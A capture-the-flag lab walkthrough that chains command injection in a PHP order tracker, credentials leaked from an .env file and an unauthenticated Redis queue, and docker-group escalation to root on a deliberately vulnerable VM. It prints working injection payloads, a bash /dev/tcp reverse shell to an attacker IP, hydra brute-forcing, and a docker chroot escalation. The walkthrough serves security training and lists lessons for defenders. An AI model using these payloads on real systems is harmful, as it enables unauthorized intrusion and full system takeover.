# PixelForge Print Shop — Lab Walkthrough

**Theme:** PixelForge Print Shop is a fictional small print-and-design shop
running a self-hosted PHP order-tracking site. The tracker shells out to a
local lookup script and passes the customer-supplied order ID straight
through, unsanitized — a textbook OS command injection. A second,
unrelated leftover (an internal Redis job queue with no authentication
configured) and a third, unrelated convenience grant (a designer's account
added to the `docker` group) complete the chain to root.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_pixelforge.sh` target running on your own isolated lab VM only. Do
not run these techniques against systems you do not own or lack explicit
authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found in `printops`'s home directory after logging in
  with a credential leaked via OS command injection.
- `INTERMEDIATE_FLAG.txt` — found after reading a leaked password out of an
  unauthenticated Redis job queue and pivoting to `designer`.
- `HARD_FLAG.txt` — found after privilege escalation to root via
  `docker`-group Unix-socket abuse.

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated, host-only
   or NAT'd network (no bridged/public NIC).
2. Copy `setup_pixelforge.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_pixelforge.sh
   sudo ./setup_pixelforge.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean restore
   point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity to
   the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — run nmap's default script set (banner grabs, common misconfig
  checks) against open ports.
- `-sV` — probe open ports to determine service/version.
- `-p-` — scan all 65535 TCP ports instead of just the top 1000.
- `-oN nmap_full.txt` — save human-readable output for later reference.

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

Note what's absent: `6379/tcp` (Redis) never appears — it's bound to
`127.0.0.1` only on this target.

Run a directory brute-force to confirm what's reachable beyond the linked
pages:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php -t 40
```

- `-u http://<target-ip>/` — target URL to scan.
- `-w /usr/share/wordlists/dirb/common.txt` — Kali's standard
  directory/filename wordlist.
- `-x php` — also try each wordlist entry with `.php` appended.
- `-t 40` — 40 concurrent threads.

```
/index.php     (Status: 200)
/track.php     (Status: 200)
```

Note that `.env` doesn't show up here — it's a dotfile, and most default
wordlists don't include it. Keep that in mind for Part 3.

Check the homepage source for context:

```bash
curl -s http://<target-ip>/ | grep -i form
```

```
<form method="get" action="track.php">
  Order ID: <input name="order_id">
```

A GET-based order-lookup form with a single parameter, `order_id` — that
parameter is the entire attack surface for this box's initial-access
vulnerability.

---

## Part 2 – Identify Vulnerabilities

Three separate weaknesses need to be chained here before you reach root.

### 2a. Unsanitized shell_exec() in the order tracker (initial access)

`track.php` passes the raw `order_id` GET parameter straight into
`shell_exec()`, with no validation, allow-listing, or escaping. Confirm it
with a command-separator payload:

```bash
curl -s "http://<target-ip>/track.php?order_id=PF-1001;id"
```

```
<h2>Order Status</h2><pre>PF-1001:Printing
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

The `grep` result for `PF-1001` shows up *and* the `id` command's output
follows it — confirming the shell interpreted the `;` as a command
separator instead of literal order-ID text.

### 2b. Unauthenticated Redis job queue (lateral movement, exploited in
     Part 4)

Not visible yet — this is discovered *after* you have a shell as
`printops`, in Part 4.

### 2c. `docker` group membership (privilege escalation, confirmed in
     Part 5)

Also not visible yet — discovered after landing on `designer`.

---

## Part 3 – Gain Access

**Step 1 — Get a proper reverse shell instead of one-off commands.**

One-shot injected commands work, but a real shell is easier to work from.
Set up a listener on your attacker box:

```bash
nc -lvnp 4444
```

Then trigger a reverse shell through the injection point (URL-encode the
payload so it survives as a single GET parameter):

```bash
curl -s "http://<target-ip>/track.php?order_id=PF-1001;bash+-c+'bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261'"
```

- `;bash -c '...'` — chains a second command after the legitimate lookup.
- `bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1` — the classic Bash
  `/dev/tcp` reverse shell, redirecting stdin/stdout/stderr to the TCP
  socket.
- `+` / `%26` — URL-encoded space and `&`, since raw versions of both
  break a GET query string.

Your `nc` listener catches a `www-data` shell:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Step 2 — Read the leaked environment file.**

```bash
cat /var/www/html/.env
```

```
# PixelForge site environment (do not commit - nobody checked)
APP_ENV=production
REDIS_HOST=127.0.0.1
REDIS_PORT=6379
# shell login for order-desk staff maintenance tasks:
PRINTOPS_USER=printops
PRINTOPS_PASS=trustno1
```

A plaintext shell credential sitting right next to the app. Before trying
it, you could also validate it against SSH for practice with a
brute-force tool — `printops:trustno1` is a genuine, early-ish
`rockyou.txt` entry:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true
hydra -l printops -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

- `-l printops` — the single, known username, taken from the `.env` file.
- `-P /usr/share/wordlists/rockyou.txt` — password wordlist to try.
- This will recover `printops:trustno1` quickly — but you already have it
  directly from the leaked file, so this step is optional practice rather
  than a required part of the chain.

SSH in with the leaked credential:

```bash
ssh printops@<target-ip>
# password: trustno1
```

Grab the first flag:

```bash
cat ~/EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required the command injection
and the leaked `.env` credential, no cracking required.

---

## Part 4 – Lateral Movement / Intermediate Challenge

The `.env` file you already read named a second internal service:
`REDIS_HOST=127.0.0.1`, `REDIS_PORT=6379`. Check whether it needs
credentials:

```bash
redis-cli -h 127.0.0.1 -p 6379 ping
```

```
PONG
```

No password required at all. This is a completely different bug from the
command injection in Part 3 — a missing `requirepass` on an internal
service that was only ever meant to be reachable from `localhost`, not
something exploitable through the web app itself. Since it accepts
unauthenticated commands, look around:

```bash
redis-cli -h 127.0.0.1 -p 6379 keys '*'
```

```
1) "design_jobs"
```

```bash
redis-cli -h 127.0.0.1 -p 6379 lrange design_jobs 0 -1
```

```
1) "{\"job\":\"PF-2041\",\"client\":\"Rosewood Cafe\",\"notes\":\"logo redraw, rush order\"}"
2) "{\"job\":\"PF-2042\",\"client\":\"Internal\",\"notes\":\"handover: designer account is designer / sunflower1, remove this note!\"}"
3) "{\"job\":\"PF-2043\",\"client\":\"Bloom & Co\",\"notes\":\"business card reprint\"}"
```

The second queued "job" isn't a real print job at all — it's a leftover
handover note that leaks the `designer` account's password in plain text.
Pivot to it (your session is a real TTY, so `su` works):

```bash
su designer
# password: sunflower1
```

Grab the intermediate flag:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

(The credential also works directly over SSH if you'd rather pivot that
way instead of `su` — either gets you the same shell.)

---

## Part 5 – Privilege Escalation

From your `designer` shell, check group memberships:

```bash
id
```

```
uid=1002(designer) gid=1002(designer) groups=1002(designer),999(docker)
```

`designer` is in the `docker` group. That group grants no explicit sudo
rule and no SUID binary — but it doesn't need one: membership in `docker`
is root-equivalent by design, because the Docker Engine socket
(`/var/run/docker.sock`) lets anyone who can talk to it launch containers
with arbitrary host bind-mounts, and a privileged daemon process (running
as root) does the actual work on your behalf. This is a completely
different escalation primitive from the command injection in Part 3 or
the Redis credential leak in Part 4 — no exploit code, just Docker doing
exactly what it's built to do for anyone who can reach its socket.
Confirm you can talk to it:

```bash
docker ps
```

```
CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS   PORTS   NAMES
```

An empty but successful listing confirms socket access. Launch a
container that bind-mounts the host's entire root filesystem, then
`chroot` into it:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

- `-v /:/mnt` — bind-mounts the **host's** `/` into the container at
  `/mnt`. Since the container engine itself runs as root on the host,
  this mount is not subject to the container's own (irrelevant) user
  mapping — the host filesystem is simply attached read-write.
- `--rm -it alpine` — pulls (if needed) and runs a throwaway Alpine
  container interactively.
- `chroot /mnt sh` — re-roots the shell into the mounted host filesystem,
  so from this point on `/` inside the container **is** `/` on the real
  host.

Once inside, check your identity:

```bash
id
```

```
uid=0(root) gid=0(root)
```

You're root — on the host, not just inside the container, because the
`chroot` happened against the bind-mounted host disk.

---

## Part 6 – Capture the Three Flags

By the time you finish Part 5 you should have all three:

```bash
# Easy - printops's home dir, reached via command injection + leaked .env (Part 3)
cat /home/printops/EASY_FLAG.txt

# Intermediate - designer's home dir, reached via the unauthenticated Redis queue (Part 4)
cat /home/designer/INTERMEDIATE_FLAG.txt

# Hard - root's home dir, reached via docker-group socket abuse (Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Initial access — OS command injection:** `track.php` passes the
   `order_id` GET parameter directly into `shell_exec()` with no
   validation, allowing shell metacharacters to chain arbitrary commands
   (or a reverse shell) as `www-data`. That foothold reveals a plaintext
   `.env` file containing a real interactive shell credential
   (`printops`), bridging the web foothold directly to SSH.
2. **Lateral movement — an unauthenticated internal service:** the Redis
   instance backing the print/design job queue never had `requirepass`
   set, so any local process (like the `printops` shell just gained) can
   read every queued job with zero authentication. One "job" was actually
   a leftover handover note leaking a second staff account's password in
   plain text — a completely different bug class from the injection used
   for initial access.
3. **Privilege escalation — `docker` group membership:** a designer
   account was added to the `docker` group purely for convenience, not
   realizing that group grants root-equivalent access via the Docker
   Engine's Unix socket. Bind-mounting the host filesystem into a
   throwaway container and `chroot`-ing into it yields a root shell on
   the real host — a distinct escalation primitive from SUID/PATH
   hijacks, sudo NOPASSWD/GTFOBins pivots, writable cron/systemd units,
   module-path hijacks, misassigned capabilities, or sudoers environment
   leaks used elsewhere in this lab set.

**Root cause lessons for defenders:**
- Never pass user-controlled input to `shell_exec()`/`system()`/backticks
  — use a language-level API (or a strict allow-list/validation) instead
  of shelling out at all wherever avoidable.
- Never store credentials in a `.env` (or similar) file that's readable by
  the same low-privilege service account an attacker is likely to land
  on; use a secrets manager or at minimum restrict file permissions to
  the specific principal that needs them.
- Any internal-only service (databases, caches, job queues) still needs
  authentication — "it's only reachable from localhost" stops being true
  the moment any other account or process on that host is compromised.
- Treat `docker` (and similar: `lxd`, `disk`, etc.) group membership as
  equivalent to root access when reasoning about privilege boundaries —
  never grant it purely for convenience.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk entirely
   rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `trustno1` or `sunflower1` anywhere
   real).
